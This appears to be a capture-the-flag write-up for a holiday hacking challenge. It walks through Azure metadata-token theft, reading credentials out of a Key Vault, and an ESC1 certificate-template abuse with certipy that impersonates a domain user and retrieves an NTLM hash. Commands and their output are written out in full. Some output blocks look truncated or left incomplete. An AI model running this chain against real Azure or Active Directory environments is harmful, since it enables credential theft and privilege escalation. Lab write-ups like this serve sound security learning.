# Active Directory

**Difficulty**: :material-pine-tree-variant::material-pine-tree-variant::material-pine-tree-variant::material-pine-tree-variant::material-pine-tree-variant:<br/>
**Direct link**: `ssh alabaster@ssh-server-vm.santaworkshopgeeseislands.org`

## Objective

!!! question "Request"
    Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

??? quote "Ribb Bonbowford"
    Hello, I'm Ribb Bonbowford. Nice to meet you!<br/><br/>Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.<br/><br/>Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.<br/><br/>I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.<br/><br/>I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.<br/><br/>Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.

## Hints

??? tip "Useful Tools"
    It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.

??? tip "Misconfiguration ADventures"
    Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.

## Solution

This requires access to Alabaster's SSH account on `ssh-server-vm.santaworkshopgeeseislands.org`, so if you haven't completed [Certificate SSHenanigans](./o17.md), you need to do that first.

While completing `Certificate SSHenanigans`, I noted Alabaster had an "impact" folder, which reminded me strongly of the [Kerberoasting Challenge from 2021](https://softwarestuffandotherrandomramblings.blogspot.com/2022/01/kringle-con-frost-fest-2021.html#obj8). The first step there is to figure out what the AD controller's IP was and what the domain was, since all (most?) of the commands we have access to require at least one of those.

Unfortunately, `nmap` wasn't installed, but maybe Azure has an API that can help? After trying **a lot** of different APIs and mostly receiving empty or unauthorised replies, someone hinted that it might help to start by seeing what we do have access to. Azure has a command for that!

```bash
$ curl https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=2022-04-01 --header "Authorization: Bearer $at" | jq
```

Alabaster can:

- "Microsoft.KeyVault/vaults/read",
- "Microsoft.KeyVault/vaults/secrets/read",
- "Microsoft.Web/sites/sourcecontrols/Read",
- "microsoft.web/sites/functions/read",
- "Microsoft.Resources/subscriptions/resourceGroups/read"

The latter three seem mostly applicable to the Azure Function App from the previous objective, so let's see which vaults are available:

```bash
$ curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?$filter=resourceType+eq+\'Microsoft.KeyVault/vaults\\'&api-version=2015-11-01" --header "Authorization: Bearer $at" | jq
```

northpole-it-kv and northpole-ssh-certs-kv. The SSH certs sounds like it'll be a more useful keyvault, so let's try getting info about it first:

```bash
$ curl "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2022-07-01" --header "Authorization: Bearer $at" | jq
```

It looks like Alabaster has permission to fetch it's secrets, which seem to be at `https://northpole-ssh-certs-kv.vault.azure.net/secrets?api-version=7.4`. Trying to fetch that returns an error about the authorization header being invalid... I guess that's because it was originally fetched for the management API rather than the vault API. Let's get a new authorization token:

```bash
$ curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" --header "Metadata:true" | jq
```

??? note "Resource naming"
    Azure is pedantic about the resource naming. I originally thought it should be `northpole-ssh-certs-kv.vault.azure.net` since that's the site I'm requesting API information from. I can get a token for that, but trying to use it to fetch tokens gave me an error explaining that it should be for `https://vault.azure.net`. I then accidentally requested a token for `https://vault.azure.net/` and again, got a token that I once again could not use.

We can then set the resulting token into a variable `bt`, in case we need our first access token again.

But there are no secrets... How about the other vault?

```bash
$ curl --header "Authorization: Bearer $bt" "https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   244  100   244    0     0   1063      0 --:--:-- --:--:-- --:--:--  1065
{
  "value": [
    {
      "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
      "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {}
    }
  ],
  "nextLink": null
}
```

Success! What's in the script?

```bash
$ curl --header "Authorization: Bearer $bt" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/versions?api-version=7.4" | jq
# Version information

  "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/d8a14e5339d04b44a20392210c0283fe",
  "attributes": {

    "recoveryLevel": "Recoverable+Purgeable",
    "recoverableDays": 90
  },
  "tags": {}
}
```

I checked both versions of the script but they seem to be equivalent. Perfect, now we have:

- The Domain Controller's IP: 10.0.0.53
- A Domain user's username: elfy
- Their password: `J4``ufC49/J4766\`
- The domain: northpole.local

And now we can use Alabaster's "impacket" tools! But which one?

Previous hints talked about the [Reportinator](./o4.md) coming in handy, which talked about `certipy`. Hints for this challenge also mentioned certificates, so let's see if it finds any vulnerabilities:

!!! warning "Remember to escape the backtick in the password!

```bash
$ certipy find -vulnerable -dc-ip 10.0.0.53 northpole.local/elfy:J4\`ufC49/J4766
...
 "Template Name": "NorthPoleUsers",
 ...
 "Certificate Authorities": [
        "northpole-npdc01-CA"
      ],
...
 "[!] Vulnerabilities": {
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"

```

Okay, so we can get a certificate with any user we want... but which user? Well, we need to access the "secret file in the inaccessible folder on the FileShare". We can already access the FileShare and see the inaccessible folder as elfy, but we can't access it:

```bash
$ smbclient.py northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53

```

You can get a certificate for any arbitrary username, but when you try to use it with `certipy auth`, you'll get an error if the user does not exist. Alabaster does exist, but cannot access the super secret share either.

Fortunately, Alabaster has a command for viewing users:
```bash
$ lookupsid.py northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53
...
$ lookupsid.py northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53 | grep SidTypeUser
500: NORTHPOLE\alabaster (SidTypeUser)
501: NORTHPOLE\Guest (SidTypeUser)
502: NORTHPOLE\krbtgt (SidTypeUser)
1000: NORTHPOLE\npdc01$ (SidTypeUser)
1104: NORTHPOLE\elfy (SidTypeUser)
1105: NORTHPOLE\wombleycube (SidTypeUser)
```

Ribb Bonbowford mentioned Wombley so let's try his account:

```bash
$ certipy req -username elfy@northpole.local -p J4\`ufC49/J4766 -ca northpole-npdc01-CA -target northpole.local -template NorthPoleUsers -upn wombleycube@northpole.local -dc-ip 10.0.0.53
...
[*] Saved certificate and private key to 'wombleycube.pfx'
$ certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53 -domain northpole.local
...
Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23

## Response

!!! quote "Ribb Bonbowford"
    Wow, nice work. I'm impressed!<br/><br/>This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.<br/><br/>Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?<br/><br/>On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.<br/><br/>Well, I guess it's probably somewhere on Space Island, but I've not been there yet.<br/><br/>I'm not a big fan of jungles, you see. I have this tendency to get lost in them.<br/><br/>Anyway, if you feel like investigating, that'd be where I'd go look.<br/><br/>Good luck and I'd try and steer clear of ChatNPT if I were you.
